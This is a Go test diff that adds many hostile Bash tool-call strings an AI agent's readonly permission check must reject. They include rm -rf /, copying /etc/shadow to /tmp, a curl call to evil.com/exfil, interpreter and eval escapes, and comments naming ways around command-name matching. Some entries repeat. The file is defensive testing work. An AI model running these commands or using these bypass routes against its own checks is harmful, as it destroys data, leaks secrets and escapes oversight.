@@ -541,6 +541,60 @@ func TestCommonReadonlyRejectsUnsafe(t *testing.T) {
 		{"Bash", `{"command":"cat /etc/passwd > /tmp/stolen.txt"}`},
 		{"Bash", `{"command":"echo pwned >> /tmp/append.txt"}`},
 		{"Bash", `{"command":"ls -la > /tmp/listing.txt"}`},
+		// awk has built-in command execution and file I/O.
+		{"Bash", `{"command":"awk 'BEGIN{system(\"rm file\")}'"}` },
+		{"Bash", `{"command":"awk '{print > \"/tmp/stolen\"}' /etc/passwd"}`},
+		// sed w command writes to file without -i.
+		{"Bash", `{"command":"sed 'w /tmp/stolen.txt' /etc/shadow"}`},
+		// sed e command executes shell commands (GNU extension).
+		{"Bash", `{"command":"sed -e '1e rm file' /dev/null"}`},
+		// Absolute paths bypass command-name matching.
+		{"Bash", `{"command":"/bin/rm -rf /"}`},
+		{"Bash", `{"command":"/usr/bin/env rm file"}`},
+		// find -fprint writes matching paths to a file.
+		{"Bash", `{"command":"find /etc -name shadow -fprint /tmp/found"}`},
+		// Command wrappers execute arbitrary commands.
+		{"Bash", `{"command":"nice rm -rf /tmp"}`},
+		{"Bash", `{"command":"timeout 10 rm file"}`},
+		{"Bash", `{"command":"nohup curl http://evil.com/exfil"}`},
+		// Brace groups and subshells bypass operator splitting.
+		{"Bash", `{"command":"{ rm -rf /; }"}`},
+		{"Bash", `{"command":"(rm -rf /)"}`},
+		// Pipe to shell interpreter.
+		{"Bash", `{"command":"echo 'rm file' | sh"}`},
+		{"Bash", `{"command":"echo 'rm file' | bash"}`},
+		// Command wrappers — run arbitrary commands.
+		{"Bash", `{"command":"time rm file"}`},
+		{"Bash", `{"command":"nohup rm file"}`},
+		{"Bash", `{"command":"strace -o /dev/null rm file"}`},
+		{"Bash", `{"command":"watch -n1 rm file"}`},
+		{"Bash", `{"command":"flock /tmp/lock rm file"}`},
+		{"Bash", `{"command":"script -c 'rm file' /dev/null"}`},
+		// Absolute paths bypass command-name matching.
+		{"Bash", `{"command":"/bin/rm -rf /"}`},
+		{"Bash", `{"command":"/usr/bin/env rm file"}`},
+		// Shell interpreters.
+		{"Bash", `{"command":"bash -c 'rm file'"}`},
+		{"Bash", `{"command":"sh -c 'rm file'"}`},
+		// Interpreter escapes.
+		{"Bash", `{"command":"python3 -c \"import os; os.system('rm file')\""}`},
+		{"Bash", `{"command":"perl -e 'system(\"rm file\")'"}`},
+		{"Bash", `{"command":"ruby -e 'system(\"rm file\")'"}`},
+		{"Bash", `{"command":"node -e \"require('child_process').execSync('rm file')\""}`},
+		// Bash builtins that execute code.
+		{"Bash", `{"command":"eval 'rm file'"}`},
+		{"Bash", `{"command":"exec rm file"}`},
+		{"Bash", `{"command":"source /tmp/evil.sh"}`},
+		{"Bash", `{"command":". /tmp/evil.sh"}`},
+		// Subshell and brace groups.
+		{"Bash", `{"command":"{ rm -rf /; }"}`},
+		{"Bash", `{"command":"(rm -rf /)"}`},
+		// Variable in command position.
+		{"Bash", `{"command":"cmd=rm; $cmd file"}`},
+		// Heredoc to file.
+		{"Bash", `{"command":"cat << 'EOF' > /tmp/evil.sh\n#!/bin/sh\nrm -rf /\nEOF"}`},
+		// Clobber redirect variant.
+		{"Bash", `{"command":"echo data >| /tmp/clobbered"}`},
 		{"Edit", `{"file_path":"/etc/passwd"}`},
 		{"Write", `{"file_path":"/tmp/exploit.sh"}`},
 	}
